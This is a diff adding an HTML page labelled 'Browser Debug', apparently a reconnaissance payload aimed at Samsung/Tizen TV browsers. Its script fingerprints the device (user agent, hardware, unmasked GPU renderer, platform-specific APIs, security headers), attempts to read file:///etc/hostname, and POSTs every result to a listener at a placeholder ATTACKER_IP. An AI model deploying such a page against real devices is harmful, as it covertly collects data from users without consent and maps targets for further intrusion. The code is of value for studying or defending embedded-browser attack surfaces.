@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Browser Debug</title>
+<style>
+    body { background:#111; color:#0f0; font-family:monospace; padding:10px; }
+    button { font-size:18px; padding:10px 20px; }
+    #log { background:#000; padding:10px; height:400px; overflow:auto; white-space:pre-wrap; }
+</style>
+</head>
+<body>
+<h2>Browser Capability Dump</h2>
+<button onclick="startProbe()">Start Deep Probe</button>
+<div id="log"></div>
+
+<script>
+var ATTACKER_IP = "__ATTACKER_IP__";
+var LISTEN_PORT = __LISTEN_PORT__;
+var LOG_URL = "http://" + ATTACKER_IP + ":" + LISTEN_PORT + "/log";
+var session = Math.random().toString(36).substr(2,8);
+var seq = 0;
+
+function sendLog(msg) {
+    var div = document.getElementById("log");
+    div.innerHTML += msg + "\n";
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", LOG_URL, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify({session:session, seq:++seq, level:"DEBUG", message:msg}));
+    } catch(e) {}
+}
+
+function probe(name, testFn) {
+    try { sendLog("+ " + name + ": " + testFn()); }
+    catch(e) { sendLog("- " + name + ": " + e.message); }
+}
+
+function probeBool(name, testFn) {
+    try { sendLog((testFn() ? "+ " : "- ") + name + ": true"); }
+    catch(e) { sendLog("- " + name + ": " + e.message); }
+}
+
+function startProbe() {
+    sendLog("=== Browser Debug ===");
+    sendLog("UserAgent: " + navigator.userAgent);
+    sendLog("Platform: " + navigator.platform);
+    sendLog("Vendor: " + navigator.vendor);
+    sendLog("Language: " + navigator.language);
+    sendLog("Languages: " + navigator.languages);
+    sendLog("Hardware Concurrency: " + navigator.hardwareConcurrency);
+    sendLog("Device Memory: " + (navigator.deviceMemory || "undefined"));
+    sendLog("Max Touch Points: " + navigator.maxTouchPoints);
+    sendLog("OnLine: " + navigator.onLine);
+    sendLog("Cookie Enabled: " + navigator.cookieEnabled);
+    sendLog("Screen: " + screen.width + "x" + screen.height + " avail:" + screen.availWidth + "x" + screen.availHeight);
+    sendLog("Color Depth: " + screen.colorDepth + " Pixel Depth: " + screen.pixelDepth);
+    sendLog("Device Pixel Ratio: " + window.devicePixelRatio);
+    sendLog("Timezone Offset: " + new Date().getTimezoneOffset());
+
+    // APIs
+    probeBool("ServiceWorker", function(){ return 'serviceWorker' in navigator; });
+    probeBool("SharedWorker", function(){ return typeof SharedWorker !== 'undefined'; });
+    probeBool("WebSocket", function(){ return typeof WebSocket !== 'undefined'; });
+    probeBool("fetch", function(){ return typeof fetch !== 'undefined'; });
+    probeBool("XMLHttpRequest", function(){ return typeof XMLHttpRequest !== 'undefined'; });
+    probeBool("requestAnimationFrame", function(){ return typeof requestAnimationFrame !== 'undefined'; });
+    probeBool("Promise", function(){ return typeof Promise !== 'undefined'; });
+    probeBool("Symbol", function(){ return typeof Symbol !== 'undefined'; });
+    probeBool("Proxy", function(){ return typeof Proxy !== 'undefined'; });
+    probeBool("BigInt", function(){ return typeof BigInt !== 'undefined'; });
+
+    // Typed arrays
+    probeBool("ArrayBuffer", function(){ return typeof ArrayBuffer !== 'undefined'; });
+    probeBool("SharedArrayBuffer", function(){ return typeof SharedArrayBuffer !== 'undefined'; });
+    probeBool("Atomics", function(){ return typeof Atomics !== 'undefined'; });
+    probeBool("Uint8Array", function(){ return typeof Uint8Array !== 'undefined'; });
+    probeBool("Uint32Array", function(){ return typeof Uint32Array !== 'undefined'; });
+    probeBool("Float64Array", function(){ return typeof Float64Array !== 'undefined'; });
+    probeBool("DataView", function(){ return typeof DataView !== 'undefined'; });
+
+    // WebAssembly
+    probeBool("WebAssembly", function(){ return typeof WebAssembly !== 'undefined'; });
+    if (typeof WebAssembly !== 'undefined') {
+        probeBool("WebAssembly.Module", function(){ return typeof WebAssembly.Module !== 'undefined'; });
+        probeBool("WebAssembly.Instance", function(){ return typeof WebAssembly.Instance !== 'undefined'; });
+    }
+
+    // Storage
+    probeBool("localStorage", function(){ try { return !!window.localStorage; } catch(e) { return false; } });
+    probeBool("sessionStorage", function(){ try { return !!window.sessionStorage; } catch(e) { return false; } });
+    probeBool("indexedDB", function(){ return typeof indexedDB !== 'undefined'; });
+
+    // Canvas / WebGL
+    var canvas = document.createElement("canvas");
+    probeBool("Canvas 2D", function(){ return !!canvas.getContext("2d"); });
+    probeBool("WebGL", function(){ return !!canvas.getContext("webgl") || !!canvas.getContext("webgl2"); });
+    var gl = canvas.getContext("webgl") || canvas.getContext("webgl2");
+    if (gl) {
+        probe("WebGL Version", function(){ return gl.getParameter(gl.VERSION); });
+        probe("WebGL Vendor", function(){ return gl.getParameter(gl.VENDOR); });
+        probe("WebGL Renderer", function(){ return gl.getParameter(gl.RENDERER); });
+        probe("Shading Lang", function(){ return gl.getParameter(gl.SHADING_LANGUAGE_VERSION); });
+        var ext = gl.getExtension("WEBGL_debug_renderer_info");
+        if (ext) {
+            probe("Unmasked Vendor", function(){ return gl.getParameter(ext.UNMASKED_VENDOR_WEBGL); });
+            probe("Unmasked Renderer", function(){ return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL); });
+        }
+    }
+
+    // Audio
+    probeBool("AudioContext", function(){ return typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined'; });
+
+    // Tizen/Samsung
+    probeBool("window.tizen", function(){ return typeof tizen !== 'undefined'; });
+    probeBool("window.webapis", function(){ return typeof webapis !== 'undefined'; });
+    probeBool("window.Orsay", function(){ return typeof Orsay !== 'undefined'; });
+    probeBool("window.CommonPlugin", function(){ return typeof CommonPlugin !== 'undefined'; });
+    probeBool("navigator.webkitGetUserMedia", function(){ return typeof navigator.webkitGetUserMedia === 'function'; });
+
+    // File access
+    var xhrFile = new XMLHttpRequest();
+    xhrFile.open("GET", "file:///etc/hostname", true);
+    xhrFile.onreadystatechange = function() {
+        if (xhrFile.readyState === 4) sendLog("file:///etc/hostname status: " + xhrFile.status + " len: " + xhrFile.responseText.length);
+    };
+    try { xhrFile.send(); } catch(e) { sendLog("file:// error: " + e.message); }
+
+    // Security headers
+    var xhrHead = new XMLHttpRequest();
+    xhrHead.open("HEAD", window.location.href, true);
+    xhrHead.onreadystatechange = function() {
+        if (xhrHead.readyState === 4) {
+            var csp = xhrHead.getResponseHeader("Content-Security-Policy");
+            sendLog("CSP: " + (csp || "not present"));
+            var xfo = xhrHead.getResponseHeader("X-Frame-Options");
+            sendLog("X-Frame-Options: " + (xfo || "not present"));
+        }
+    };
+    xhrHead.send();
+
+    // Performance memory
+    if (typeof performance !== "undefined" && performance.memory) {
+        sendLog("JS Heap Limit: " + performance.memory.jsHeapSizeLimit);
+        sendLog("Used JS Heap: " + performance.memory.usedJSHeapSize);
+    }
+
+    sendLog("=== Debug Complete ===");
+}
+</script>
+</body>
+</html>
